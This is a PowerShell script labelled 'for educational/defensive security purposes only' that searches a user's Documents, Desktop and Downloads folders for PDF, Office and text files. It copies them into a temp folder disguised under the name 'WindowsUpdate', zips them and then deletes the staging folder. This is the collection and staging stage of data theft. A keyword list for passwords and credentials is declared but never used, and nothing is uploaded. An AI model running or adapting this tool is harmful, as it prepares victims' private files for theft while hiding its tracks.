# collector.ps1 - File Collection Script
# WARNING: FOR EDUCATIONAL/DEFENSIVE SECURITY PURPOSES ONLY

# Define what files to look for
$targetExtensions = @("*.pdf", "*.docx", "*.xlsx", "*.txt", "*.pptx")

# Define where to search
$searchPaths = @(
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\Downloads"
)

# Keywords to identify sensitive files
$sensitiveKeywords = @("password", "confidential", "secret", "budget", "salary", "financial", "credentials")

# Create temporary staging folder
Write-Host "[*] Creating staging directory..." -ForegroundColor Yellow
$randomNumber = Get-Random -Minimum 1000 -Maximum 9999
$stagingDir = "$env:TEMP\WindowsUpdate_$randomNumber"
New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null
Write-Host "[+] Staging directory created: $stagingDir" -ForegroundColor Green

# Search and collect files
Write-Host "[*] Searching for sensitive files..." -ForegroundColor Yellow
$fileCount = 0

foreach ($path in $searchPaths) {
    if (Test-Path $path) {
        Write-Host "[*] Scanning: $path" -ForegroundColor Cyan
        
        foreach ($extension in $targetExtensions) {
            $foundFiles = Get-ChildItem -Path $path -Filter $extension -Recurse -ErrorAction SilentlyContinue
            
            foreach ($file in $foundFiles) {
                # Collect all files with target extensions
                Copy-Item -Path $file.FullName -Destination $stagingDir -ErrorAction SilentlyContinue
                $fileCount++
                Write-Host "[+] Collected: $($file.Name)" -ForegroundColor Green
            }
        }
    }
}

Write-Host "[+] Total files collected: $fileCount" -ForegroundColor Green

# Compress collected files if any were found
if ($fileCount -gt 0) {
    Write-Host "[*] Compressing collected files..." -ForegroundColor Yellow
    
    $downloadsPath = "$env:USERPROFILE\Downloads"
    $zipFile = "$downloadsPath\saved_files.zip"
    
    Compress-Archive -Path "$stagingDir\*" -DestinationPath $zipFile -Force
    
    $zipSize = (Get-Item $zipFile).Length / 1MB
    $zipSizeRounded = [math]::Round($zipSize, 2)
    
    Write-Host "[+] Archive created: $zipFile" -ForegroundColor Green
    Write-Host "[+] Archive size: $zipSizeRounded MB" -ForegroundColor Green
    
    # Clean up staging directory
    Write-Host "[*] Cleaning up..." -ForegroundColor Yellow
    Remove-Item -Path $stagingDir -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "[+] Cleanup completed" -ForegroundColor Green
    
} else {
    Write-Host "[!] No files collected" -ForegroundColor Yellow
    Remove-Item -Path $stagingDir -Force -ErrorAction SilentlyContinue
}

Write-Host "[*] Collection completed" -ForegroundColor Cyan
